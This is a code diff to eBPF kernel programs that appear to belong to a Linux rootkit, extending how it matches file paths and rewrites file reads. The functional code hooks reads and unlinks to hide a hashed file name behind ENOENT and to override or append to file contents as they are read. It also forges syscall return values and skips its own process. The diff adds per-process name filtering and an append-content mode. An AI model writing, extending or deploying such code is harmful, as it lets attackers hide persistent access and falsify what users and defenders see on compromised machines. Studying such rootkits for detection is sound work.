@@ -16,6 +16,17 @@
 #include "override_dir_kern.h"
 #include "override_cnt_kern.h"
 
+static __attribute__((always_inline)) u64 get_comm_hash()
+{
+    char comm[32];
+    bpf_get_current_comm(&comm, sizeof(comm));
+
+    u64 hash = FNV_BASIS;
+    update_hash_str(&hash, comm);
+
+    return hash;
+}
+
 static __attribute__((always_inline)) u64 get_fs_hash(struct dentry *dentry)
 {
     struct inode *d_inode;
@@ -39,6 +50,18 @@ static __attribute__((always_inline)) u64 get_fs_hash(struct dentry *dentry)
     return hash;
 }
 
+static __attribute__((always_inline)) int path_attr_matches(struct rk_path_attr_t *path_attr, struct dentry *dentry) {    
+    if (path_attr->fs_hash && path_attr->fs_hash != get_fs_hash(dentry)) {
+        return 0;
+    }
+
+    if (path_attr->comm_hash && path_attr->comm_hash != get_comm_hash()) {
+        return 0;
+    }
+
+    return 1;
+}
+
 static __attribute__((always_inline)) struct rk_path_attr_t *get_path_attr(struct dentry *dentry)
 {
     struct qstr qstr;
@@ -58,9 +81,7 @@ static __attribute__((always_inline)) struct rk_path_attr_t *get_path_attr(struc
         bpf_probe_read(&d_parent, sizeof(d_parent), &dentry->d_parent);
 
         if (dentry != d_parent)
-        {
             bpf_probe_read(&d_inode, sizeof(d_inode), &d_parent->d_inode);
-        }
 
         bpf_probe_read(&qstr, sizeof(qstr), &dentry->d_name);
         bpf_probe_read_str(&name, sizeof(name), (void *)qstr.name);
@@ -76,25 +97,16 @@ static __attribute__((always_inline)) struct rk_path_attr_t *get_path_attr(struc
 
         struct rk_path_attr_t *path_attr = bpf_map_lookup_elem(&rk_path_attrs, &key);
         if (!path_attr)
-        {
             key.pos = 0;
-        }
         else
         {
-            if (path_attr->action.id)
-            {
-                if (!path_attr->fs_hash || path_attr->fs_hash == get_fs_hash(dentry))
-                { 
-                    return path_attr;
-                }
-            }
+            if (path_attr->action.id && path_attr_matches(path_attr, dentry))
+                return path_attr;
             key.pos++;
         }
 
         if (end)
-        {
             return 0;
-        }
 
         dentry = d_parent;
     }
@@ -110,18 +122,14 @@ static __attribute__((always_inline)) int access_path(struct path *path)
     LOAD_CONSTANT("rk_pid", pid);
 
     if (pid == pid_tgid >> 32)
-    {
         return 0;
-    }
 
     struct dentry *dentry;
     bpf_probe_read(&dentry, sizeof(dentry), &path->dentry);
 
     struct rk_path_attr_t *path_attr = get_path_attr(dentry);
     if (!path_attr)
-    {
         return 0;
-    }
 
     struct rk_file_t file = {
         .action = path_attr->action,
@@ -137,9 +145,7 @@ static __attribute__((always_inline)) int handle_unlink(struct pt_regs *ctx, con
     LOAD_CONSTANT("rk_hash", rk_hash);
 
     if (!rk_hash)
-    {
         return 0;
-    }
 
     const char basename[256];
     bpf_probe_read_str((void *)basename, sizeof(basename), (void *)filename);
@@ -151,21 +157,13 @@ static __attribute__((always_inline)) int handle_unlink(struct pt_regs *ctx, con
     {
         if (basename[i] == '\0')
         {
-            bpf_printk(">>>: %lu %lu\n", hash, rk_hash);
-
             if (hash == rk_hash)
-            {
                 bpf_override_return(ctx, -ENOENT);
-            }
         }
         else if (basename[i] == '/')
-        {
             hash = FNV_BASIS;
-        }
         else
-        {
             update_hash_byte(&hash, basename[i]);
-        }
     }
 
     return 0;
@@ -212,9 +210,7 @@ static __attribute__((always_inline)) int path_accessed(struct pt_regs *ctx)
     u64 pid_tgid = bpf_get_current_pid_tgid();
     struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
     if (!file)
-    {
         return 0;
-    }
 
     struct rk_fd_key_t fd_key =
         {
@@ -307,9 +303,7 @@ int kprobe_sys_read(struct pt_regs *ctx)
 
     struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
     if (!fd_attr)
-    {
         return 0;
-    }
 
     if (fd_attr->action.id & OVERRIDE_RETURN_ACTION)
     {
@@ -337,9 +331,7 @@ int _vfs_read(struct pt_regs *ctx)
     u64 pid_tgid = bpf_get_current_pid_tgid();
     struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
     if (!file)
-    {
         return 0;
-    }
 
     struct rk_fd_key_t fd_key =
         {
@@ -349,11 +341,12 @@ int _vfs_read(struct pt_regs *ctx)
 
     struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
     if (!fd_attr)
-    {
         return 0;
-    }
 
-    bpf_tail_call(ctx, &rk_progs, file->action.id);
+    if (fd_attr->action.id & OVERRIDE_CONTENT_ACTION)
+        bpf_tail_call(ctx, &rk_progs, OVERRIDE_CONTENT_PROG);
+    else
+        bpf_tail_call(ctx, &rk_progs, fd_attr->action.id);
 
     return 0;
 }
@@ -364,9 +357,7 @@ int __x64_sys_read_ret(struct pt_regs *ctx)
     u64 pid_tgid = bpf_get_current_pid_tgid();
     struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
     if (!file)
-    {
         return 0;
-    }
 
     struct rk_fd_key_t fd_key =
         {
@@ -376,22 +367,25 @@ int __x64_sys_read_ret(struct pt_regs *ctx)
 
     struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
     if (!fd_attr)
-    {
         return 0;
-    }
 
     if (fd_attr->action.id & OVERRIDE_CONTENT_ACTION)
     {
-        override_content(ctx, fd_attr);
+        if (fd_attr->action.id & APPEND_CONTENT_ACTION)
+        {
+            int ret = (int)PT_REGS_RC(ctx);
+            if (!ret)
+                override_content(ctx, fd_attr);
+        }
+        else
+            override_content(ctx, fd_attr);
     }
     else if (fd_attr->action.id & OVERRIDE_RETURN_ACTION)
     {
         bpf_override_return(ctx, fd_attr->action.return_value);
 
         if (fd_attr->action.id & KMSG_ACTION)
-        {
             fd_attr->action.id &= ~OVERRIDE_RETURN_ACTION;
-        }
     }
 
     return 0;
